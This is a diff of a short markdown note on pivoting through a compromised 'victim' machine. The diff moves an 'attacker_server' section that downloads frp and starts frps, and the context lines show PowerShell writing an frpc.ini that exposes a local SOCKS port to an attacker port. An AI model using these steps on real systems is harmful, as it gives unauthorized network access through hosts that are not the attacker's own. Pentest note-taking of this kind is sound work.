@@ -1,5 +1,10 @@
 # pivoting a computer not bindable
 
+## attacker_server
+1) setting frp
+    - download https://github.com/fatedier/frp/releases
+    - ./frps -c ./frps.ini 
+
 ## victim
 
 1) getting socks server
@@ -46,12 +51,6 @@ Add-Content frpc.ini "local_port = $socksPort"
 Add-Content frpc.ini "remote_port = $attackerExposePort"
 .\frpc -c .\frpc.ini
 ```
-
-## attacker_server
-
-1) setting frp
-    - download https://github.com/fatedier/frp/releases
-    - ./frps -c ./frps.ini 
 
 ## (opcional) attacker_laptop
 
